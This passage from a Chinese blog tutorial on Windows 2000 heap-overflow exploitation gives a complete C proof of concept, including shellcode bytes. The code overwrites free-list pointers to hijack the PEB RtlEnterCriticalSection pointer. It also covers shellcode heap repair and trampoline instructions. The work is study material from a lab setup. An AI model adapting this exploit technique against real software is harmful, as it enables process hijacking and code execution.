alt="image-20220412153048362"></p><p>如果我们把射击目标定位合法地址，这条指令执行后，<code>0x44444444</code>将会被写入目标</p><h1 id="堆溢出利用下代码植入"><a class="markdownIt-Anchor" href="#堆溢出利用下代码植入"></a> 堆溢出利用（下）——代码植入</h1><h2 id="dword-shoot-的利用方法"><a class="markdownIt-Anchor" href="#dword-shoot-的利用方法"></a> DWORD SHOOT 的利用方法</h2><p>与栈溢出中的“地毯式轰炸”不同，堆溢出更加精准，往往直接狙击重要目标。</p><p>DWORD SHOOT 的<strong>常用目标</strong>：</p><ol><li>内存变量：<br>修改能够影响程序执行的重要标志变量，改变程序流程。</li><li>代码逻辑：<br>修改代码段重要函数的关键逻辑有时可以达到一定攻击效果，如逻辑判断代码或者身份验证函数。</li><li>函数返回地址：<br>由于栈帧移位，函数地址不固定，所以通过函数返回地址攻击，具有局限性</li><li>异常处理机制：<br>当程序产生异常时， Windows 会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为 DWORD SHOOT 的上等目标，这包括 S.E.H（ structure exception handler）、 F.V.E.H（ First Vectored Exception Handler）、进程环境块（ P.E.B）中的 U.E.F (Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H 指针(T.E.H)。</li><li>函数指针：<br>系统有时会使用一些函数指针，比如调用动态链接库中的函数、 C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。</li><li>P.E.B 中线程同步函数的入口地址：<br>在每个进程的 P.E.B 中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和 RtlLeaveCriticalSection()，并且在进程退出时会被 ExitProcess()调用。如果能够通过 DWORD SHOOT 修改这对指针中的其中一个，那么在程序退出时 ExitProcess()将会被骗去调用我们的 shellcode。由于 P.E.B 的位置始终不会变化，这对指针在 P.E.B 中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的 exploit 成为可能。</li></ol><h2 id="狙击-peb-中-rtlentercritical-section的函数指针"><a class="markdownIt-Anchor" href="#狙击-peb-中-rtlentercritical-section的函数指针"></a> 狙击 P.E.B 中 RtlEnterCritical-Section()的函数指针</h2><p>当进程退出时，ExitProcess() 函数要做很多善后工作，其中一定会用到临界区函数RtlEnterCriticalSection() 和 RtlLeaveCriticalSection() 来同步线程防止异常数据产生。</p><p>ExitProcess() 函数调用临界区函数的方法比较独特，是通过进程环境块 P.E.B 中偏移 0x20 处存放的函数指针来间接完成的。具体说来就是在 <code>0x7FFDF020</code> 处存放着指向 RtlEnterCriticalSection() 的指针，在 <code>0x7FFDF024</code> 处存放着指向 RtlLeaveCriticalSection()的指针。</p><p><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220421140454311.png" alt="image-20220421140454311"></p><p>下面我们就以 <code>0x7FFDF020</code>处的 RtlEnterCriticalSection() 指针为目标，联系 DWORD SHOOT 后，劫持进程、植入代码。</p><h2 id="调试-2"><a class="markdownIt-Anchor" href="#调试-2"></a> 调试</h2><table><thead><tr><th></th><th>实验环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>windows 2000虚拟机</td><td>分配策略对操作系统很敏感</td></tr><tr><td>编译器</td><td>Visrual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>如果使用 debug 版本，实验将会失败</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;<span class="comment">//200 bytes 0x90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="comment">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="comment">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="comment">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="comment">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="comment">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="comment">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="comment">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span></span><br><span class="line"><span class="comment">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;;</span></span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="comment">&quot;\xB8\x20\xF0\xFD\x7F&quot;  //MOV EAX,7FFDF020</span></span><br><span class="line"><span class="comment">&quot;\xBB\x60\x20\xF8\x77&quot;  //MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="comment">&quot;\x89\x18&quot;//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="comment">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="comment">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="comment">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="comment">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="comment">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="comment">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="comment">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="comment">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span></span><br><span class="line"><span class="comment">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;;</span></span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line"><span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先简单地解释一下程序和实验步骤。<br>（1） h1 向堆中申请了 <code>200</code> 字节的空间。<br>（2） memcpy 的上限错误地写成了<code>0x200</code>，这实际上是 <code>512</code> 字节，所以会产生溢出。<br>（3） h1 分配完之后，后边紧接着的是一个大空闲块（尾块）。<br>（4）超过 <code>200</code> 字节的数据将覆盖尾块的块首。<br>（5）用伪造的指针覆盖尾块块首中的空表指针，当 h2 分配时，将导致 DWORD SHOOT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DWORD SHOOT 详细过程</span><br><span class="line"></span><br><span class="line">第一次链表分配(h1):</span><br><span class="line">先向后遍历找到最大堆块，进行比较，然后再正向遍历，找到最小的符合要求的堆块。这里只有尾块，所以先分割尾块进行分配。先把尾块划分成两部分，然后修改两个块首大小信息，尾块指针复制到指定位置，然后回到空表freelist[0]，修改空表指针。</span><br><span class="line"></span><br><span class="line">缓冲区溢出，修改尾块的前驱后继指针</span><br><span class="line"></span><br><span class="line">第二次链表分配(h2):</span><br><span class="line">通过空表找到尾块，然后分割尾块，修改块首大小信息，复制尾块指针到指定位置，然后原本是通过后继指针回到freelist[0]，但是后继指针被覆盖，Node-&gt;blink(fake)指向了目标位置（target），然后用Node-&gt;flink(fake)修改了目标位置的内容。</span><br></pre></td></tr></table></figure><p>（6） DWORD SHOOT 的目标是 <code>0x7FFDF020</code> 处的 RtlEnterCriticalSection()函数指针，可以简单地将其直接修改为 shellcode 的位置。<br>（7） DWORD SHOOT 完毕后，堆溢出导致异常，最终将调用 ExitProcess()结束进程。<br>（8） ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从 P.E.B 中拿出了指向 shellcode 的指针，因此 shellcode 被执行。</p><p>为了能够调试真实的堆状态，我们在代码中手动加入了一个断点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>依然是直接运行.exe 文件，在断点将进程中断时，再把调试器 attach 上。</p><p>我们先向堆中复制 <code>200</code> 个 <code>0x90</code> 字节，看看堆中的情况是否与预测一致，如下图，与我们分析一致，200字节后就是尾块<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220415151434002-165052222800440.png" alt="image-20220415151434002"></p><p>缓冲区布置如下:<br>（1）将我们那段 168 字节的 shellcode 用 0x90 字节补充为 200 字节。<br>（2）紧随其后，附上 8 字节的块首信息。为了防止在 DWORD SHOOT 发生之前产生异常，不妨直接将块首从内存中复制使用： “\x16\x01\x1A\x00\x00\x10\x00\x00”。<br>（3）前向指针**( flink )<strong>是 DWORD SHOOT 的“子弹”，这里直接使用 shellcode 的起始地址<code>0x00360688</code>。<br>（4）后向指针</strong>( blink )**是 DWORD SHOOT 的“目标”，这里填入 P.E.B 中的函数指针地址 <code>0x7FFDF020</code>。</p><blockquote><p>**注意：**shellcode 的起始地址 <code>0x00360688</code>需要在调试时确定。有时，HeapCreat()函数创建的堆区起始位置会发生变化。</p></blockquote><p>这时，缓冲区内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行一下，发现那个 failwest 消息框没有弹出来。原来，这里有一个问题：<br>**被我们修改的 P.E.B 里的函数指针不光会被 ExitProcess()调用， shellcode 中的函数也会使用。**当 shellcode 的函数使用临界区时，会像 ExitProcess()一样被骗。</p><p>为了解决这个问题，我们对 shellcode 稍加修改，在一开始就把我们 DWORD SHOOT 的指针修复回去，以防出错。重新调试一遍，记下 <code>0x7FFDF020</code> 处的函数指针为 <code>0x77F82060</code>。</p><blockquote><p><strong>提示：</strong><br>P.E.B 中存放 RtlEnterCriticalSection() 函数指针的位置 0x7FFDF020 是固定的，但是， RtlEnterCriticalSection() 的地址也就是这个指针的值 0x77F82060 有可能会因为补丁和操作系统而不一样，请在动态调试时确定。</p></blockquote><p>指令与对应机器码</p><table><thead><tr><th>指 令</th><th>机 器 码</th></tr></thead><tbody><tr><td>MOV EAX,7FFDF020</td><td>“\xB8\x20\xF0\xFD\x7F”</td></tr><tr><td>MOV EBX,77F82060（可能需要调试确定这个地址）</td><td>“\xBB\x60\x20\xF8\x77”</td></tr><tr><td>MOV [EAX],EBX</td><td>“\x89\x18”</td></tr></tbody></table><p>将这 3 条指令的机器码放在 shellcode 之前，重新调整 shellcode 的长度为 200 字节，然后是 8 字节块首， 8 字节伪造的指针。</p><p>这时，缓冲区内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">&quot;\xB8\x20\xF0\xFD\x7F&quot;</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">&quot;\xBB\x60\x20\xF8\x77&quot;</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">&quot;\x89\x18&quot;</span><span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>现在把断点注释掉，build直接运行。结果如下图所示，注入成功！！！<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220415152912303-165052222800441.png" alt="注入成功"></p><h1 id="堆溢出利用的注意事项"><a class="markdownIt-Anchor" href="#堆溢出利用的注意事项"></a> 堆溢出利用的注意事项</h1><h2 id="调试堆与常态堆的区别"><a class="markdownIt-Anchor" href="#调试堆与常态堆的区别"></a> 调试堆与常态堆的区别</h2><p>（1）调试堆不使用快表，只用空表分配。<br>（2）所有堆块都被加上了多余的 16 字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。<br>（3）块首的标志位不同。</p><h2 id="在-shellcode-中修复环境"><a class="markdownIt-Anchor" href="#在-shellcode-中修复环境"></a> 在 shellcode 中修复环境</h2><p>比较简单<strong>修复堆区</strong>的做法包括如下步骤。<br>（1）在堆区偏移 <code>0x28</code>的地方存放着堆区所有空闲块的总和 TotalFreeSize。<br>（2）把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小的两个字节（self size）修改成堆区空闲块总容量的大小(TotalFreeSize）。<br>（3）把该块的 flag 位设置为 0x10（last entry 尾块）。<br>（4）把 freelist[0]的前向指针和后向指针都指向这个堆块。<br>这样可以使整个堆区“看起来好像是”刚初始化完只有一个大块的样子，不但可以继续完成分配工作，还保护了堆中已有的数据。</p><h2 id="定位-shellcode-的跳板"><a class="markdownIt-Anchor" href="#定位-shellcode-的跳板"></a> 定位 shellcode 的跳板</h2><p>可以使用几种指令作为<strong>跳板</strong>定位 shellcode，这些指令一般可以在 netapi32.dll、 user32.dll、 rp crt4.dll 中搜到不少，代码如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CALL DWORD PTR [EDI+0x78]</span><br><span class="line">CALL DWORD PTR [ESI+0x4C]</span><br><span class="line">CALL DWORD PTR [EBP+0x74]  </span><br></pre></td></tr></table></figure><h2 id="dword-shoot-后的指针反射现象"><a class="markdownIt-Anchor" href="#dword-shoot-后的指针反射现象"></a> DWORD SHOOT 后的“指针反射”现象</h2><p>回顾前面介绍 DWORD SHOOT 时所举的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>node -&gt; blink(fake) -&gt; flink = node -&gt; flink(fake);</code> 将会导致 DWORD SHOOT。你可能会发现<code>node -&gt; flink(fake) -&gt; blink = node -&gt; blink(fake);</code> 也能导致 DWORD SHOOT。这次 DWORD SHOOT 将把目标地址写回 shellcode 起始位置偏移 4 个字节的地方。我把类似这样的第二次 DWORD SHOOT 称为 “<strong>指针反射</strong>”。</p><p>有时在指针反射发生前就会产生异常。然而，大多数情况下，指针反射是会发生的，糟糕的是，它会<strong>把目标地址刚好写进 shellcode 中</strong>。这对于没有跳板直接利用 DWORD SHOOT 劫持进程的 exploit 来说是一个很大的限制，因为它将破坏 4 个字节的 shellcode。</p><p>幸运的是，很多情况下 4 个字节的目标地址都会被处理器当做“无关痛痒”的指令安全地执行过去。</p><hr><blockquote><p>参考：</p><p>《0day,软件安全漏洞分析技术》</p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;如果你不了解堆的话，请先看我的上一篇博文《堆的工作原理》，然后再来学习堆溢出，结合食用，更易理解。&lt;/p&gt;
&lt;/blockquote&gt;
